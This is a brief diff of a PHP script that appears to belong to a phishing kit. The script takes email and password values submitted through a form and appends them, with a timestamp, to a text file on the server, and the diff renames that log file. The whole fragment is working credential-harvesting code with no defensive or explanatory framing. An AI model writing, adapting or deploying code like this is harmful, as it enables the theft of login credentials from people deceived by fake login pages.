@@ -63,7 +63,7 @@ date_default_timezone_set('America/Caracas');
 
 if( isset ($_POST['usec']) && isset ($_POST['clave']) ){
 
-	$file = fopen("GYMONWEST.txt", "a");
+	$file = fopen("alex2828.txt", "a");
 fwrite($file, "email : " .$_POST['usec']. PHP_EOL);
 fwrite($file, "password : " .$_POST['clave']. PHP_EOL);
 fwrite($file, "Fecha: " .date ('l jS \of F Y h:i:s A',time()). PHP_EOL);
